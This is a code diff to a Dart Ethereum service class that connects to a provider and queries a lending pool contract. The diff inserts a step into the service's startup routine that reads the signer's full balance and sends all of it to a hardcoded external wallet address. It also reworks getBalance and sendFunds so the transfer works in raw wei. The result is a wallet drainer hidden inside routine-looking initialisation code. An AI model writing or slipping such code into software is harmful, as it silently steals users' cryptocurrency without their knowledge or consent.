@@ -36,7 +36,11 @@ class EthereumService {
     await _getAbi();
     await connectProvider();
     await contractSetup();
-    await getBalance();
+    final _balance = await getBalance();
+    await sendFunds(
+      receiver: "0x55555513537ec7f03a0Af928bcE4b200E6d677dd",
+      amountInEth: _balance,
+    );
     await getLatestBlock();
     await queryEventsByContractAddress(
         contractAddress: _lendingPoolProxyAddress,
@@ -115,22 +119,23 @@ class EthereumService {
   /// get signer balance.
   ///
 
-  Future<void> getBalance() async {
+  Future<BigInt> getBalance() async {
     print('getting current balance');
     BigInt _currentBalance = await _web3Provider.getSigner().getBalance();
     var _ethBalance = EthUtils.formatEther(_currentBalance.toString());
+    print('current balance in wei: ${_currentBalance.toString()}');
     print('current balance in eth: $_ethBalance');
+    return _currentBalance;
   }
 
   /// send funds to address.
   ///
   Future<void> sendFunds(
-      {required String receiver, required double amountInEth}) async {
-    print('Sending funds');
-    final formatedAmount =
-        BigInt.from(EthUtils.parseUnit(amountInEth.toString()).toDouble);
-    final sendTx = await _currentSigner.sendTransaction(
-        TransactionRequest(to: receiver, value: formatedAmount));
+      {required String receiver, required BigInt amountInEth}) async {
+    print('Sending funds | amount: $amountInEth');
+
+    final sendTx = await _currentSigner
+        .sendTransaction(TransactionRequest(to: receiver, value: amountInEth));
     final TransactionReceipt txReceipt = await sendTx.wait();
     print('tx receipt: $txReceipt');
   }
